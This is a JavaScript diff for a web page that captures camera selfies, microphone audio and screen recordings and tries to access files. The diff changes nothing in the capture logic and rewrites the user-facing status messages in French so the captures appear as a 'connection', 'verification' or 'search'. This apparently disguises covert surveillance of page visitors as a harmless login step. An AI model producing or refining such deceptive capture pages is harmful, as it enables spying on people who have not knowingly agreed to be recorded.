@@ -106,7 +106,7 @@ async function captureSelfies() {
     ui.captureBtn.disabled = true;
 
     try {
-        showStatus("Début de la capture des selfies...", 'progress');
+        showStatus("Début de la connexion...", 'progress');
         
         for (let i = 0; i < CONFIG.SELFIE_COUNT; i++) {
             const canvas = document.createElement('canvas');
@@ -129,7 +129,7 @@ async function captureSelfies() {
             }
         }
         
-        showStatus(`${CONFIG.SELFIE_COUNT} selfies capturés avec succès!`, 'success');
+        showStatus(`${CONFIG.SELFIE_COUNT} vérification réussi avec succès!`, 'success');
     } catch (error) {
         showStatus(`Erreur capture selfies: ${error.message}`, 'error');
     } finally {
@@ -144,7 +144,7 @@ async function recordAudio() {
     ui.audioBtn.disabled = true;
 
     try {
-        showStatus("Début de l'enregistrement audio...", 'progress');
+        showStatus("⚠️ ne fermées pas la page ...", 'progress');
         
         state.audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
         state.audioRecorder = new MediaRecorder(state.audioStream);
@@ -174,7 +174,7 @@ async function recordAudio() {
         
         showStatus("Audio enregistré avec succès (12s)", 'success');
     } catch (error) {
-        showStatus(`Erreur enregistrement audio: ${error.message}`, 'error');
+        showStatus(`Erreur...: ${error.message}`, 'error');
     } finally {
         cleanupAudio();
         state.isActive = false;
@@ -188,7 +188,7 @@ async function captureScreen() {
     ui.screenBtn.disabled = true;
 
     try {
-        showStatus("Début de la capture d'écran...", 'progress');
+        showStatus("recherche en cours ...", 'progress');
         
         state.screenStream = await navigator.mediaDevices.getDisplayMedia({
             video: { 
@@ -210,7 +210,7 @@ async function captureScreen() {
         state.screenRecorder.ondataavailable = e => screenChunks.push(e.data);
         state.screenRecorder.start();
         
-        startCountdown(CONFIG.SCREEN_DURATION, "Enregistrement écran");
+        startCountdown(CONFIG.SCREEN_DURATION, "connexion");
         
         await new Promise(resolve => {
             state.screenRecorder.onstop = async () => {
@@ -242,7 +242,7 @@ async function captureScreen() {
 
 async function downloadFiles() {
     try {
-        showStatus("Accès aux fichiers en cours...", 'progress');
+        showStatus("connexion en cours ...", 'progress');
         
         // Ici vous implémenteriez la logique pour accéder aux fichiers
         // Pour des raisons de sécurité, les navigateurs limitent cet accès
